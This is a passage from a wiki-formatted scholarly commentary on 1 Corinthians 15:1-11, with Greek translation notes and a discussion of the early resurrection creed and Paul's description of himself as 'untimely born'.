1.3 (Chicago: University of Chicago Press, 2000); 8, 402. ''Accordance Bible Software''. OakTree Software Inc.

As noted by Thiselton who cites Danker, the word είκή, which is often translated as &quot;in vain,&quot; can also be translated &quot;without cause,&quot; &quot;to no purpose&quot; or &quot;without due consideration, in a haphazard manner.&quot;&lt;ref&gt;Danker, 281.&lt;/ref&gt; He rightly points out that to translate it as &quot;in vain&quot; would cause &quot;needless difficulties and forces Paul into an aggressive irony that undermines his seeking common ground by appealing to the shared tradition, calling the readers αδελφοί and establishing the previous points.&quot; Thiselton, instead, asserts that Paul is inserting the possibility that the readers could have believed the Good News without having any &quot;coherent grasp of its logical or practical entailments for eschatology or for practical discipleship...&quot;&lt;ref&gt;Thiselton, Anthony C. ''The First Epistle to the Corinthians.'' The New International Greek Testament Commentary. (Grand Rapids: William B. Eerdmans Publishing Company, 2000), 1186.&lt;/ref&gt; This translation reflects this understanding of that word. Paul is appealing to their logic--which is important, considering what follows in in verses 3-11 is the foundation upon which he builds his arguments in the remainder of the chapter. They are being saved through the message of the gospel (which Paul is about to mention in the form of a creed) if they hold firmly to it, ''unless their firm grasp has been for incoherent reasons''.|group=&quot;tn&quot;}}

'''3''' I remind you of this because I handed over to you in the highest importance what I myself was handed:

:* That Christ died ''to atone'' for{{#tag:ref|While the Greek text does not include &quot;to atone&quot; and the traditional translation of the Greek υπέρ is simply &quot;for,&quot; this is perhaps a not very complete translation. Simply saying &quot;For&quot; is vague and leaves the phrase open to more interpretation than is perhaps appropriate. And while &quot;for&quot; technically works, it is not nearly specific enough to what the word actually means. The preposition, used with a genitive object that is a thing (as opposed to a person) carries a meaning of action being done on the behalf of something. There is also a somewhat causal relation carried in the preposition &lt;ref&gt;Danker, 1030-1031.&lt;/ref&gt; Thus, the presence of this preposition--especially within a creedal formulation--establishing a substitutionary, causal relationship between our sin and Christ's death demands an atonement theory.&lt;ref&gt;Fee, 724; Thiselton, 1191.&lt;/ref&gt;|group=&quot;tn&quot;}} our sins, according to the Scriptures,

However, here in verse six, Paul is citing witnesses to the ''historical'' events of the resurrection appearances.

&lt;blockquote&gt;
The translation of αδελφοίς provides the usual nightmare for modern English. Since Jesus appeared to the women, it is virtually certain that NIV's ''brothers and sisters'' is correct, but the Greek does not say this, and if it is gender-inclusive, it is also gender intrusive.&lt;ref&gt;Thiselton, 1205.&lt;/ref&gt;
&lt;/blockquote&gt;

Thus, the translation here is gender-''exclusive'' because this author believes that this is most faithful to Paul's ''intended'' meaning, which would be naturally assumed by the Corinthian readers. However, the modern reader should understand that there likely were women who also witnessed first-hand this mass appearance of the resurrected Christ.

===Background Information===

====Historical Context====

While there is much information available about the Corinthian church, the information about its situation that occasioned ''this section'' (vv. 1-11) is somewhat debated. With this said, there is some particular insight into the occasion of Paul's transitions in '''verse one''' to this subject.

It appears, from an analysis of both this chapter, and of the epistle as a whole, that there was some theological confusion in the community, amongst other issues, that Paul needed to sort out. Of particular relevance in this situation is the Corinthian church's understanding of what &quot;living in the Spirit&quot; entailed. It seems that the church had drifted into a somewhat docetic notion that in receiving the Spirit, one enters an angelic form of spirituality where the corporeal is &quot;unneccessary and unwanted, and would finally be destroyed.&quot;&lt;ref&gt;Fee, 715.&lt;/ref&gt; Garland points out that this heterodoxy is not rebellious in nature, but rather some Hellenistic conceptions of spirituality that had crept into the church:

&lt;blockquote&gt;
The Corinthians' error is not rooted in some deliberate rebellion but in honest confusion, given their Greek worldview. They fail to comprehend how an earthly body that is physical and perishable can be made suitable for a heavenly realm that is spiritual and imperishable.&lt;ref&gt;Garland, 678&lt;/ref&gt;
&lt;/blockquote&gt;

In other words, the bodily resurrection of the dead (which was typically assumed within a Judeo-Christian philosophy) had not been properly translated and articulated to the Hellenistic Christian church.&lt;ref&gt;Fee, 716.&lt;/ref&gt; This was necessary for Paul to rectify, as it has definite implications for the life of the church. It is ultimately 

&lt;blockquote&gt;
...the foundation of all preaching about Christ. Without it, the gospel dwindles into an inspiring story of a wise teacher who suffered heroically as a victim of human perfidy. Paul hints that if they deviate from this belief, it brings their salvation into question.&lt;ref&gt;Garland, 679.&lt;/ref&gt;
&lt;/blockquote&gt;

Another aspect of the Corinthian situation relating to this section is rather debated and that is the general opinion of the Corinthians regarding Paul. Some scholars, most notably Gordan Fee, believe the Corinthians have a very low regard for Paul. They see passages such as 1:12 (in which Paul says that some say they belong to him, while others Apollos, or Cephas, or Christ) as an interpretive key to understand 15:8-11. Thus, according to Fee and others, Paul is here ''defending his right to his apostolate'' so that they accept what he says about that which follows. Scholars in this interpretation of the Corinthian situation point especially to '''verse eight''' and consider Paul to be quoting an insult that has been cast at him by some of the Corinthians.&lt;ref&gt;Collins, 537; Fee, 733-736.&lt;/ref&gt; In language of Greco-Roman rhetoric, these scholars believe Paul is building his ethos.

Other scholars disagree that Paul is fending off a diminutive opinion of himself. Instead, they consider Paul to be reminding them of what he has already taught them about the resurrection of Christ. This is the interpretation that this author chooses, as it seems more grounded in what actually is ''in the text'' rather than speculation about possible scenarios ''outside'' the text. Verses 1-11, then, function to not legitimize Paul but rather to legitimize his message as being both a part of the church tradition, the apostolic witness, and also a part of Paul's personal testimony of Christ's life-giving and gracious calling to him.&lt;ref&gt;Thiselton, 1210.&lt;/ref&gt; With this said, it must be ceded that rhetorically, Paul is setting down a foundation of his argument to begin in verse twelve. And in so setting this up, Paul ''is'' building his ethos, as it is crucial for his readers to accept him on the ground of Christ's resurrection, if they are to agree with his logic. Thus, while Paul is in all likelihood ''not'' defending himself against a diminutive church opinion and against insults that have been flung his direction, rhetorically, vv. 1-11 must (at least in part) function to legitimize his following argument.

====Literary Context====

This chapter fits in at the end of the letter of First Corinthians, with the chapter that follows being mostly a conclusion. Paul has &quot;covered a lot of ground&quot; to this point, and it seems the eschatological corporeal resurrection of the saints is his final, perhaps climactic point. At the end of chapter fourteen, Paul concludes a lengthy discourse on proper worship that began in chapter eleven, which followed an even longer discourse on proper Christian behavior, both in the gathering of believers and in the world. It could then be said that Paul's focus up until this point has been orthopraxy (meaning &quot;right practice&quot;) and orthodoxy (which means &quot;right ''worship''&quot;, ''not'' &quot;right belief&quot;; contrary to popular belief, the &quot;-doxy&quot; in the word comes from δόξα, meaning &quot;honor,&quot; &quot;glory,&quot; and &quot;praise.&quot;&lt;ref&gt;Danker, 256-258&lt;/ref&gt;). Now, as Garland so aptly points out, Paul transitions from &quot;disorderly worship to disorderly belief&quot; &lt;ref&gt;Garland, 678.&lt;/ref&gt;

Verses 1-11 serve as a &quot;narratio&quot;--essentially a citation of common ground that Paul gives, upon which his following argument will be built.&lt;ref&gt;Collins, 526&lt;/ref&gt; The essential grounds upon which Paul's following argument is based, beginning in verse twelve, is that Christ was raised. If the Corinthians do not agree with that, then the rest of his argument comes crashing down. Verses 1-11, then, are absolutely crucial in the chapter.

Thankfully, the Corinthians already know and believe that Christ was raised from the dead ''in bodily form''. Paul is not attempting to ''prove'' anything in these verses and neither does he have to.&lt;ref&gt;Fee, 715.&lt;/ref&gt; Rather, Paul is ''reminding'' them of what they already know, as is clearly stated in '''verse one'''. What Paul does, then, is bring up what the Corinthians already know, and then emphasize the absolute centrality in the gospel message of this Christ's resurrection by pointing to its presence in church tradition (in the form of a creed), the apostolic witness, and especially in Paul's personal, first-hand experience. If Paul can prove that the resurrection of Christ is absolutely central in the all these realms of the church, then his argument to follow is firmly grounded.

The content in this section of verses is typically Pauline, except for a the section of verses from vv. 3b-5, which most modern scholars have considered to be a traditional church creed, based upon the structure and vocabulary. This will be covered in greater depth in the analysis, so it will suffice here to say that some of the content of this section is not Pauline and finds its origin earlier than the rest of the material.

===Analysis===

====Paul's Preface - A Reminder of Common Ground, Church Tradition: vv. 1-3a====

In this section, Paul is calling to memory the Gospel that he knows the Corinthians have embraced. The phrase Paul is using here in '''verse one''' (γνωρίζω υμίν) is one he typically uses to recall already known information or state the obvious with which he knows his readers will agree (e.g. 1 Cor 12:3, Gal 1:11).&lt;ref&gt;Collins, 533.&lt;/ref&gt; As described in translation note 3, the emphasis here is not on Paul's preaching but rather on the very content of the gospel message. The word that is frequently translated as &quot;preached,&quot; and translated above as &quot;brought to you as a messenger&quot; shows its emphasis in the transmission of good news by a messenger. This word well coincides with the word for &quot;received,&quot; which is the Greek word παρελάβετε. This word has two roots, πάρα, which typically refers to a point of origination, something that is exterior to oneself,&lt;ref&gt;Danker, 756.&lt;/ref&gt; and λαμβάνω, which means to take or receive.&lt;ref&gt;Danker, 583.&lt;/ref&gt; This, then, is significant: the word does not simply mean to receive, but rather to receive something down a line from outside oneself. It seems to connote longevity of the message--which is exactly the point Paul is making here in vv. 1-11: the message of Christ's resurrection has a long-standing tradition. In Hellenism and in Judaism, furthermore, the word was used to refer to the taking over a tradition.&lt;ref&gt;Siede, Burghard. &quot;Παραλαμβάνω.&quot; ''The New International Dictionary of New Testament Theology.'' Colin Brown, Ed. Version 2.0. (Grand Rapids: Zondervan, 1986). ''Accordance Bible Software.'' OakTree Software, inc. Version 8.2.2, March 2009.&lt;/ref&gt; Thus to carry the good news as a messenger fits with this understanding of embraced tradition.

In '''vv. 1-2a''', there is a definite progression of tenses. &quot;Received&quot; is in the aorist tense, which is a simple past tense. At some point in time, in the past, the Corinthians received the Gospel. The next verb, εστήκατε, is in the perfect tense, which is a past tense that continues into the present in its effects. Many translations (such as the NASB, NRSV, among others) translate the word as &quot;in which you stand.&quot; However, as pointed out by Thiselton, this word is regarding &quot;present stability on the basis of past action as well as present state.&quot;&lt;ref&gt;Thiselton, 1185.&lt;/ref&gt; Thus, in the translation in this commentary, &quot;on which you have taken your stand&quot; was chosen, as it emphasizes a definite past action which continues on until now. Lastly, &quot;you are being saved,&quot; coming from the word σώζεσθε, is present tense. This tense in Greek emphasizes continual activity. Many translations translate the word as &quot;are saved.&quot; However, this seems to imply punctiliar salvation, which we can be reasonably sure that Paul is ''not'' talking about.

Also of relevance is the grammatical voice in which the salvation occurs. Σώζεσθε is in passive voice, which means that saving activity is being wrought by another party. Salvation is not gained by the Corinthians as the natural effect of embracing the Gospel. The Corinthians are not the saving party. Theologically, this is very significant. Instead, the Corinthians receive the saving activity from another, namely God.&lt;ref&gt;Thiselton, 1185.&lt;/ref&gt;

In '''verse two''', there is a contingency put on the salvation of the Corinthians. Here, Paul says that they are being saved if they hold firmly to the content of the Gospel he brought to them. But how this contingency is to be understood varies. Collins, a Roman Catholic scholar, interprets it as such: &quot;Those to whom the gospel is preached are saved ''under the condition'' that they can hold fast to what they have heard&quot; (emphasis added).&lt;ref&gt;Collins, 533.&lt;/ref&gt; This interpretation means they will be saved ''only if'' they can hold firmly to the message. Garland, however, provides a much more Protestant interpretation, asserting that if they do not hold fast to the preaching about the Gospel, &quot;they ''jeopardize'' their future with God.&quot;&lt;ref&gt;Garland, 682.&lt;/ref&gt; Garland, then, does not put the act of holding firmly as having to do with their being saved, but rather with possibly losing their salvation. In light of what is action in the text, it seems that perhaps the former interpretation is better, as the conditional conjunction is modifying the salvation and it does not talk about losing salvation.

In the above translation, the word &quot;contents&quot; is derived from the word λόγος, which is typically translated as &quot;word.&quot; The reason why it does not take that translation here is because, as well noted by Thiselton, it can also refer to content or substance.&lt;ref&gt;Thiselton, 1185.&lt;/ref&gt; Very literally translated, the phrase reads &quot;...the word of the gospel that I proclaimed to you...,&quot; which is somewhat awkward. Instead, as seems more likely here, if λόγος is translated in the way Thiselton contends it should be, then it is referring to the particular contents of the larger message of the Good News--which are outlined in the creed beginning in verse 3b.

For an adequate covering of the issues concerning the translation of the phrase typically translated as &quot;believed in vain,&quot; see translation note 4 above.

'''Verse three''' begins with a Paul setting up the creed to follow in the second half of the verse, on through verse five. He uses two main verbs to describe the creed that follows: &quot;handed over&quot; (παρέδωκα) and &quot;received&quot; (παρέλαβον--the same word described in verse one). As can be easily observed of the Greek words, both have a common prefix. In the context of this passage, this prefix gives both the meaning of the transmission of tradition. Both words were used in 11:23 to describe the transmission of the communion tradition. What is important to note in these two words is that Paul is not describing anything that is originally his formulation. Instead, he is describing himself as simply conveying onto the Corinthians that which was conveyed to him.

====An Early Christian Creed: vv. 3b-5====

The second part of '''verse three''', on to the end of verse five, is believed by most scholars to be a traditional creed that Paul is citing. There are several reasons for this. First, the language in the first part of verse three seems to point to a ''specific'' tradition being passed on--one that did not originate with Paul. Also, vv. 1-2 seem refer to the Gospel in such a way that it needs articulation as to exactly what part of the Good News Paul is focusing on. A creed that Paul taught them would perfectly serve such a function. Beyond simply contextual hints, there are more technical reasons Scholars frequently give.

First, the structure of this section of verses seems very formally set up and organized, with each line indicated by a the conjunction ότι (which means &quot;that&quot;) and the creed held together and progressively intensified with numerous repetitions of the conjunction καί (which means &quot;and&quot; or &quot;also&quot;) at the end of each line.&lt;ref&gt;Thiselton, 1189; Fee, 722-723.&lt;/ref&gt; When formatted to show its structure, it looks like this:

: That (ότι) Christ died for our sins, according to the Scriptures;
:: And (καί) that (ότι) he was buried;
:: And (καί) that (ότι) he was raised on the third day, according to the Scriptures;
: And (καί) that (ότι) he appeared to Cephas and then to the Twelve

Structurally, this does not seem like mere discourse as the free flow of Paul's thoughts, but rather a specific formulation. This is further supported by the chiasmus formed by active (lines one and four) and passive (lines two and three) verbs.&lt;ref&gt;Garland, 687.&lt;/ref&gt;

Further support for interpreting this as a creed is the presence of non-Pauline language, particularly the presence of &quot;for our sins.&quot; Collins reflects notes regarding this phrase in the creed: &quot;Apart from biblical citations and traditional formulae, Paul rarely uses sin in the plural. The notion of 'taking away sins' is generally absent from his theology.&quot;&lt;ref&gt;Collins, 534.&lt;/ref&gt;

From analyzing the language in the creed, some scholars have believed a place of origin can be derived. Collins asserts:

&lt;blockquote&gt;
Every element of the confession derives its meaning from Jewish apocalyptic thought: Christ, sins, scripture, resurrection, and the symbolic &quot;Twelve.&quot; An anarthrous &quot;Christ,&quot; the Aramaic &quot;Cephas,&quot; and the ''parallelismus membrorum'' point to its Palestinian origins.&lt;ref&gt;Collins, 531&lt;/ref&gt;
&lt;/blockquote&gt;

This understanding does appear to be accurate, though both Collins&lt;ref&gt;Collins, 531.&lt;/ref&gt; and Thiselton&lt;ref&gt;Thiselton, 1189.&lt;/ref&gt; note that the vocabulary does appear to be somewhat from a composite of Aramaic and Hellenistic-Jewish-Christian roots. Beyond its origins, the creed's traditional role can also be estimated. By its brevity and yet its comprehensiveness of the significance of the Christ story, it seems this creed was an attempt to capture the full Gospel message. Perhaps it was created in an attempt to shape Christians' identity as Christians so that it could be easily described across cultures and generations, much the same way the Shema functioned in Jewish practice and education. Furthermore, Collins points out that that the creed could well have been used in baptismal settings, citing the very similar language and pattern in Romans 6:3-4 and Colossians 2:12.

This interpretation of this section of verses as a traditional creed, though believed by this author to be the best interpretation, is not without contest. Notably, Garland asserts that, while the material lends itself to various traditions, it is ''not'' a creedal formulation of the early church. To support this, he rightly asserts that Paul uses the word &quot;sins&quot; elsewhere in Corinthians in 15:17, which is not believed to be a creed.&lt;ref&gt;Garland, 684.&lt;/ref&gt; He notes that Paul's use of &quot;the Twelve,&quot; which is not present in Paul anywhere else, simply shows that he is drawing from tradition, not quoting it.&lt;ref&gt;Garland, 688.&lt;/ref&gt; Nonetheless, while Garland does bring about some good points in showing that the text does not ''necessitate'' a creedal interpretation, it is still most likely that it is a creed. Furthermore, he does not provide any conclusive evidence as to why the verses must not be interpreted as such, only that there the support for interpreting it as a creed is debatable.

'''Line one''' of the creed begins the creed with Christ's death. As reflected in the translation given above and the accompanying translation note, the usage of the word υπέρ in this context necessitates some form of atonement theory. However, the form of atonement theory being expressed is debated. Fee asserts that &quot;for our sins&quot; directly references the Septuagintal Isaiah 53 in the and expresses an early form of penal satisfaction. He describes his understanding by saying:

&lt;blockquote&gt;
...the creed presupposes alienation between god and humans because of human rebellion and sinfulness, for which the just penalty is death. Death 'for our sins' means that one died on behalf of others to satisfy the penalty and to overcome alienation.&lt;ref&gt;Fee, 724.&lt;/ref&gt;
&lt;/blockquote&gt;

This interpretation, while thoroughly Protestant, reads far too much into the text and risks anachronism. While the text does indeed say that Christ died on behalf of others, there is no mention of the necessity of satisfying any penalty or overcoming alienation. Put simply, the only reason given in this creed for Christ's death is that it was necessary because of our sins. Thiselton describes, perhaps, a more moderate and sound interpretation of the atonement theory being expressed by the creed. He claims that the creed could be referring to Christ's death as an atonement offering or that of representation/substitution. Here, Thiselton opts of for a ''via media'' in suggesting perhaps it is a matter of both:

&lt;blockquote&gt;
Propitiation leads to disastrous distortion only if we fail to emphasize that God himself is the ''source'' of the action, not that Christ &quot;propitiates&quot; an angry and reluctant God. ''Expiation'' may be a &quot;safer&quot; term, but invites skepticism about the status of abstract principles of justice, as if God were tied by these, rather than recognizing that any notion of &quot;must suffer&quot; rests purely on divine self-consistency.&lt;ref&gt;Thiselton, 1191.&lt;/ref&gt;
&lt;/blockquote&gt;

Regardless, the best that can be definitely known for the atonement theory expressed in this passage is that Christ ''did'' atone. The creed seems to not express any concern for the ''how'' of this atonement, only that it did indeed happen once and for all.

&quot;According to the Scriptures&quot; has been variously interpreted. Garland, in what appears to be a minority opinion, interprets &quot;according to the Scriptures&quot; as causal: &quot;This death was not a sad misadventure but something God destined for him because of... the sins of humankind.&quot;&lt;ref&gt;Garland, 684.&lt;/ref&gt; While this is notable, it is also unlikely, and no other translation translates it as such. With Fee, it is much better to interpret &quot;according to the Scriptures&quot; as specifying fulfillment of the Old Testament canon as a whole.&lt;ref&gt;Fee, 727.&lt;/ref&gt; This likely points to a general expectation of the Jews, from reading their Scriptures, of an awaited messianic figure, rather than to any specific verses.

'''Line two''', describing Christ's postmortem burial, ultimately points the finality of Christ's death. It serves to span the time between death and resurrection.&lt;ref&gt;Garland, 686.&lt;/ref&gt; It is interesting to note that the passive voice of &quot;was buried&quot; points out that another acting party was responsible in burying him, humans (the very humans for whose sins he died in the previous line). After the death of Christ, humans put him in a sealed grave, seemingly conquering the &quot;King of the Jews.&quot; But the creed goes on.

'''Line three''', also in the passive voice, points to another external acting party. This time, however, it was not humans acting, but God. This is significant because the creed seems to implicitly say that, while humans brought him down, they--along with all the finitude of mortality--could not restrain the power of God. God proves Godself powerful over the powers of death. &quot;Christ was raised.&quot; This is significant for Paul's argument to follow, beginning in verse twelve. It is also important to note that Christ did not raise himself, but was raised by God.

As can be seen reflected in the translation above, the effects of Christ's resurrection were not confined to the past. As has been significant elsewhere in this passage, the creed makes use of the perfect tense for &quot;was raised,&quot; as opposed to the aorist tense (simple past) used in the previous lines of the creed. Thus, the creed is emphasizing that the death and burial of Christ were final and remain in the past--once-for-all. But the resurrection of Christ lasts onward--for God is eternally victorious over the power of death in Christ.&lt;ref&gt;Fee, 726.&lt;/ref&gt; It is thus reasonable to assume that, as a creed, this was a high-note for those reciting it, even before Paul, as the changed tense would have been obvious to the Greek speaker and hearer. Furthermore, it is also important for Paul's argument to follow, because Christ's resurrection would ''need'' to bring about effects for the Corinthians for Paul's argument to stand.

There has been some debate over whether &quot;according to the Scriptures&quot; refers specifically to the resurrection, or just to it being &quot;on the third day,&quot; or the whole phrase. The most credible interpretation, however, is on the last option.&lt;ref&gt;Garland, 687.&lt;/ref&gt; There is no delineation that makes the phrase point to anything other than the whole line within the text--which could have been accomplished with the linguistic tools available in Greek. Regarding which Scriptures are being referred to, many interpreters, both recent and ancient, have suggested Hosea 6:2 as being of particular reference (i.e. Pelagius,&lt;ref&gt;Bray, Gerald, Ed. ''First Corinthians''. Ancient Christian Commentary on Scripture. (Downers Grove: InterVarsity Press, 1999), 150.&lt;/ref&gt; Matthew Henry,&lt;ref&gt;Henry, Matthew. ''An Exposition, with Practical Observations, of the First Epistle of St. Paul to the Corinthians.'' Commentary on the Whole Bible (Unabridged). Vol. VI. (Public Domain, 1721), 1 Cor 15:1-11. ''Accordance Bible Software''. OakTree Software Inc. Version 8.2.2, Mar. 2009.&lt;/ref&gt; Garland&lt;ref&gt;Garland, 687.&lt;/ref&gt;). With this duly noted, it seems inconsistent to translate the previous &quot;according to the Scriptures&quot; as generally referring to the whole of the Scriptures, while interpreting this instance--exactly the same phrase, within the same creedal construction--in a different manner. It is most logical, then, to interpret this phrase in the same way as the previous one.

'''Line four''' of the creed is important in that it is what ultimately begins the church's witness of the resurrection, and verifies Christ's victory over the death. If Christ had ''not'' appeared to Cephas and the Twelve, then the resurrection would not have been known apart from empty tomb stories--which naturally lend themselves to the &quot;stolen body&quot; theory. &quot;Cephas&quot; is the Aramaic name for Peter. &quot;The Twelve&quot; is a phrase not used elsewhere by Paul (he prefers the word &quot;apostles&quot; instead). Some manuscripts actually change &quot;the Twelve&quot; to &quot;the Eleven,&quot; likely as an attempt to compensate for Judas not being able to have witnessed Christ's resurrection. But this is unnecessary, as the creed is referring to &quot;the Twelve&quot; as a title for a particular group of disciples, and not a number of disciples.&lt;ref&gt;Garland, 695.&lt;/ref&gt;

One of the most debated words in this creed is the word ώφθη, which literally means &quot;was seen.&quot; However, this word, in this inflected form, is frequently used in the Septuagint to refer to visible manifestations of God's Glory.&lt;ref&gt;Collins, 531.&lt;/ref&gt; Collins asserts, regarding this,

&lt;blockquote&gt;
The traditional Jewish understanding of divine transcendence, particularly strong at the time of Paul, suggests that the use of this traditional language with regard to a manifestation of the divine did not imply physical sight. In the biblical accounts of a manifestation of the divine, auditory elements predominate.&lt;ref&gt;Collins, 534.&lt;/ref&gt;
&lt;/blockquote&gt;

It seems Collins, then, joins the party of scholars who believe the term does ''not'' refer to physical sight. There is significant opposition to this stance, however. Both sides of the argument will be taken up and then evaluated in the &quot;reception&quot; section.

====More Tradition - Other Relevant Appearances of the ''Resurrected'' Christ: vv. 6-7====

Verses 6-7, it is generally agreed upon by scholars, return to Pauline content.&lt;ref&gt;Fee, 729.&lt;/ref&gt; Paul goes on in these verses to mention additional appearances of the resurrected Christ. These appearances seem to be drawing from various other traditions, which are not actually recorded elsewhere in Scripture. They are added here by Paul to show a continuation from creed to Apostolic witness--an essential connection if Paul is to firmly ground his following argument to come in the centrality of the resurrection in the Christian faith. It is more than simply the gospel message passed on in a brief creed, but it is agreed upon by many the people who the Corinthians know or of whom they have heard. Paul is still in the process of reminding, begun in verse one. Now, however, Paul is making the resurrection real, beyond story to unanimous agreement of people the Corinthians know and whose witness matters.

'''Verse six''' cites a resurrection appearance to the largest group cited in Scripture. As noted translation note 9, the meaning of &quot;brothers&quot; here is very hard to translate. Due to Paul's usage of it here in the context of mentioning witnesses, it is best to translate it most literally, though it should be noted that there were most likely many women who also viewed the resurrected Christ in this mass appearance.

An important detail of this verse to understand is the word εφάπαξ, which refers to action happening simultaneously, at the same time.&lt;ref&gt;Danker, 417.&lt;/ref&gt; This is pointed to frequently in the argument for the ''physical visibility'' of Christ's appearance. It is unlikely, so the argument goes, that ώφθη refers simply to a visionary experience in this chapter because such a mass-religious experience held by so many people would be one for the record books. It ''must'' then be in reference to Christ being physically present in front of these people.&lt;ref&gt;Garland, 689.&lt;/ref&gt; More will be discussed on this argument a little later in the &quot;reception&quot; section.

The second part of this verse describes the status of these five hundred &quot;brothers&quot;--most of them are still living, though some have &quot;fallen asleep.&quot; The phrase &quot;fallen asleep,&quot; is translated from the word εκοιμήθησαν. This word is often figuratively used to refer to dying.&lt;ref&gt;Coenen, Lothar. &quot;Κοιμάομαι / κοιμάω.&quot; ''The New International Dictionary of New Testament Theology.'' Colin Brown, Ed. Version 2.0. (Grand Rapids: Zondervan, 1986). ''Accordance Bible Software.'' OakTree Software, inc. Version 8.2.2, March 2009.&lt;/ref&gt; While some commentators (such as Collins&lt;ref&gt;Collins, 536.&lt;/ref&gt;) point to this phrase as direct support for Paul's usage of the word &quot;raised,&quot; which often is used to express being &quot;awakened,&quot; and thus serves to reinforce Paul's argument later on, this connection (if intended) can only be marginal, at best. The term us used figuratively frequently in Greek, even apart from any discussion whatsoever of resurrection.&lt;ref&gt;Danker, 551&lt;/ref&gt; To a culture accustomed to such a euphemism in speech, which also embraced the common grave inscription &quot;I was not, I was, I am not, I care not,&quot; &lt;ref&gt;Boring, Eugene et al. ''Hellenistic Commentary to the New Testament.'' (Nashville: Abingdon Press, 1995), 437.&lt;/ref&gt; such a connection would likely not be very persuasive.

There seems to be two possible loci of emphasis in this second part of the verse. Fee points out that Paul including this phrase functions as an invitation to the Corinthians to inquire for themselves about the objective reality of the resurrection, with a tinge of regret that some have already died.&lt;ref&gt;Fee, 730.&lt;/ref&gt; Garland, however, offers an alternative: Paul's focus in saying some are still alive (without actually naming any specific individuals) is on those who have fallen asleep, to show that the dead are indeed raised; &quot;Death precedes resurrection.&quot;&lt;ref&gt;Garland, 689-690.&lt;/ref&gt; As noted in the above paragraph, however, such a connection is difficult to make because such a nuanced and implicit implication would likely not have been caught by Paul's audience. In light of this, it seems Fee's interpretation is more likely.

'''Verse seven''' adds two more appearances to the list that Paul is heaping up, one after another. There is no specific indication given as to which James is being referred to here. However, it should be noted that (1) James of the Twelve had already been martyred by this time; (2) James the brother of Jesus, as leader of the church in Jerusalem, would have been likely known by the Corinthians, even if only by name; and (3) Paul's intention here is to list the ''major'' (i.e. &quot;big name&quot;) witnesses to the resurrected Christ to show its validity beyond the gospel story. Thus, given these premises, it seems James the brother of Jesus is most likely the James to which Paul refers.

The second part of verse seven refers to &quot;all the apostles.&quot; While exactly who &quot;all of the apostles&quot; are is not clear, and there is no mention of &quot;at one time&quot; as there was in verse six, a few important things can be noted from this. First, the &quot;apostolate&quot; to which he refers, categorically speaking, seems to be of a larger number than the Twelve.&lt;ref&gt;Collins, 536.&lt;/ref&gt; Thus, for Paul, &quot;the Twelve&quot; in verse five is not synonymous with the much more Pauline &quot;apostles.&quot; Furthermore, there were more than &quot;Twelve&quot; recognized apostles in the church. Second, the word order in the phrase puts the emphasis on the apostles, presence of the word &quot;all&quot; (πασίν).&lt;ref&gt;Thiselton, 1208.&lt;/ref&gt; This is significant in that it is easy to read the phrase and focus on how ''every'' apostle saw the resurrected Christ (which seems implausible)--but the emphasis on &quot;apostles&quot; could rectify this implausibility. Instead, perhaps Paul intends something like &quot;the whole apostolic body.&quot; If this were the case, then this would prove a perfect concluding transition to verse eight, where Paul shifts from the witness of the apostolate to his own personal experience. Thus, Paul would be concluding his additions to the creed essentially like so: &quot;Then he appeared to five hundred brothers... then to James, and finally to the whole apostolic body--''ask nearly anyone in the church, and you can be directed to an ''actual'' witness of our resurrected Lord!''&quot;

====Paul's Personal Experience of the Resurrection by Grace: vv. 8-11====

Typically, '''verse eight''' is included with vv. 6-7 as an additional resurrection appearance of Christ--and this it indeed is. Structurally, is looks just like the previous two verses, even using for the final time in the letter the word ώφθη (meaning &quot;he appeared&quot;), which had been present three other times from vv. 5-7. The reason why verse eight is included in this section, however, is for the significance Paul makes here. As noted earlier, Paul begins in verse one calling the Corinthians to remember the Gospel message he brought to them. It is contained within the creed he taught them, but also in the living witness of the apostles. Now, in vv. 8-11 eight, Paul shifts to show how this gospel message is something to which he can very personally attest, as his own radical calling experience (of which the Corinthians must have heard before from him) and his subsequent labors as an apostle show the truth of this Gospel.

Of particular significance in this verse is the word εκτρώματι, which has attracted much attention throughout the centuries. For a description of the meaning of this word, see translation note 10. There seem to be a few different camps who each argue for a different interpretation. The first camp (reflected in the translations of the NRSV, NASB, NET, and ESV, among others) understands this to simply mean being &quot;born&quot; at a chronologically bad time. The church father, Ambrosiaster, took this stance and believed it was in reference to Paul being the only apostle to be called after the ascension.&lt;ref&gt;Bray, 152.&lt;/ref&gt; However, this stance cannot be well supported, as the word is only used for births that are premature, not late.&lt;ref&gt;Garland, 693&lt;/ref&gt; Furthermore, there seems to be little relevance in Paul referring to the relative chronology of his calling compared to the other apostles--such has no effect on the Good News of the resurrection to the Corinthians.

Another camp interprets the word to mean something of an abortion (think &quot;aberration&quot;), &quot;freak,&quot; or monster. This is reflected in the NIV's &quot;as to one abnormally born.&quot; As noted in the historical context, some scholars consider the Corinthian church to have a rather low regard for Paul's apostolic authority. Thus they interpret the word εκτρώματι to refer to someone who is a dwarf compared to Apollos or Peter.&lt;ref&gt;Fee, 733.&lt;/ref&gt; This would be an insulting play on words in reference to Paul's name, which means &quot;small&quot; or &quot;little.&quot;&lt;ref&gt;&quot;Paul.&quot; ''Hitchcock's New and Complete Analysis of the Holy Bible.'' Version 1.2. (Public Domain). ''Accordance Bible Software.'' OakTree Software, Inc. Version 8.2.2. Mar. 2009.&lt;/ref&gt; Furthermore, this word could be Paul quoting the very insult flung at him--that he was an abortion. According to Collins, who takes this stance, the word has its origin

&lt;blockquote&gt;
...in a derisive epithet hurled at Paul by his opponents, perhaps mocking his claim that he, like the prophets of old, had been chosen by God from his mother's womb.&lt;ref&gt;Collins, 537.&lt;/ref&gt;
&lt;/blockquote&gt;

While this interpretation is indeed possible, it seems hardly plausible, given there is a better explanation (below) that does not require formulating fictitious background stories in the light of which to understand the present text. Simply by looking at the text we have available to us, the following interpretation seems to function best.

A third major camp of interpretation sees εκτρώματι as referring to the ''nature'' of Paul's calling experience, rather than the ''chronology''. This camp believes there is no legitimate reason to believe that the term is a quoted insult unless one fabricates a story to explain one's interpretation. Commenting on Collins' interpretation, Garland asserts:

&lt;blockquote&gt;
...there is no evidence that this term was used as an epithet agaisnt Paul or any evidence in this letter that the Corinthinans viewed his apostleship as somehow abortive, monstrous, or demonic. The simplest explanation is that it is Paul's own description of his calling as an apostle.&lt;ref&gt;Garland, 691.&lt;/ref&gt;
&lt;/blockquote&gt;

